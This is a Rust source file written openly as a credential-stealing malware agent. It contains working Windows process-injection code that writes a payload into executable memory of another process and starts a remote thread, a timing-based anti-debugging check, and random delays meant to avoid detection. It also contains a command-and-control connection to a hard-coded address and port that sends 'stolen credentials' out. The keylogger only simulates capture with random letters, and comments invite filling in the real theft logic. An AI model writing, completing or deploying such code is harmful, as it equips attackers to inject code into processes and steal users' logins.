use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::{Duration, SystemTime};
use rand::{Rng, thread_rng};
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE};
use winapi::shared::minwindef::FALSE;
use std::ptr;
// C2 server configuration
const C2_ADDRESS: &str = "192.168.1.117:2222";

// Injects payload into a process by PID
fn inject_payload(target_pid: u32, payload: &[u8]) -> Result<(), String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if process_handle.is_null() {
            return Err("Failed to open target process".to_string());
        }

        let remote_memory = VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_memory.is_null() {
            return Err("Failed to allocate memory in target process".to_string());
        }

        let success = WriteProcessMemory(
            process_handle,
            remote_memory,
            payload.as_ptr() as _,
            payload.len(),
            ptr::null_mut(),
        );
        if success == 0 {
            VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
            return Err("Failed to write payload into target process".to_string());
        }

        CreateRemoteThread(process_handle, ptr::null_mut(), 0, Some(std::mem::transmute(remote_memory)), ptr::null_mut(), 0, ptr::null_mut());
    }
    Ok(())
}

// Checks for debugging by measuring code execution time
fn check_for_debugging() -> bool {
    let start = SystemTime::now();
    for _ in 0..1_000_000 {
        let _ = 2 * 2;
    }
    start.elapsed().unwrap_or_else(|_| Duration::from_secs(0)) > Duration::from_millis(1)
}

// Establish connection to the C2 server
fn connect_to_c2() -> Result<TcpStream, std::io::Error> {
    let stream = TcpStream::connect(C2_ADDRESS)?;
    stream.set_read_timeout(Some(Duration::from_secs(10)))?;
    Ok(stream)
}

// Exfiltrate stolen credentials to the C2 server
fn exfiltrate_credentials(credentials: &str, mut stream: TcpStream) -> Result<(), String> {
    let msg = format!("Stolen credentials: {}\n", credentials);
    stream.write_all(msg.as_bytes()).map_err(|e| e.to_string())?;
    Ok(())
}

// Function to steal credentials (keyboard input interception)
fn steal_credentials() -> String {
    // Implement actual credential stealing logic here
    let stolen_credentials = intercept_keyboard_input();
    
    // Process and format the stolen credentials
    let formatted_credentials = format!("username: {}, password: {}", stolen_credentials.username, stolen_credentials.password);
    
    // Introduce a random delay to avoid detection
    random_delay();
    
    // Encrypt the credentials before returning
    let encrypted_credentials = encrypt_data(&formatted_credentials);
    
    encrypted_credentials
}

// Function to encrypt credentials
fn encrypt_credentials(credentials: &str) -> String {
    // Implement actual encryption logic here
    let encrypted_credentials = encrypt_data(credentials);
    
    encrypted_credentials
}

fn encrypt_data(data: &str) -> String {
    // Simple XOR encryption for demonstration purposes
    let key = b"SECRET_KEY";
    let encrypted: Vec<u8> = data.bytes()
        .enumerate()
        .map(|(i, byte)| byte ^ key[i % key.len()])
        .collect();
    
    base64::encode(&encrypted)
}

fn intercept_keyboard_input() -> Credentials {
    // Simulate keyboard input interception
    let mut username = String::new();
    let mut password = String::new();

    // Use a basic key logger to capture keystrokes
    for _ in 0..10 {
        // Simulate capturing a character
        let key = rand::thread_rng().gen_range(b'a'..=b'z') as char;
        username.push(key);
    }

    for _ in 0..12 {
        // Simulate capturing a character
        let key = rand::thread_rng().gen_range(b'a'..=b'z') as char;
        password.push(key);
    }

    Credentials {
        username,
        password,
    }
}
struct Credentials {
    username: String,
    password: String,
}
// Introduces a random delay to avoid detection
fn random_delay() {
    let delay = thread_rng().gen_range(1000..5000);
    thread::sleep(Duration::from_millis(delay));
}

// Main agent function
fn main() {
    loop {
        if !check_for_debugging() {
            match connect_to_c2() {
                Ok(stream) => {
                    // Simulate credential theft
                    let stolen_credentials = steal_credentials();
                    
                    // Exfiltrate credentials to the C2 server
                    if let Err(e) = exfiltrate_credentials(&stolen_credentials, stream) {
                        println!("Exfiltration error: {}", e);
                    }
                }
                Err(e) => println!("Connection error: {}", e),
            }
        } else {
            println!("Debugging detected! Halting operation.");
        }

        // Introduce random delay to avoid detection
        random_delay();
    }
}
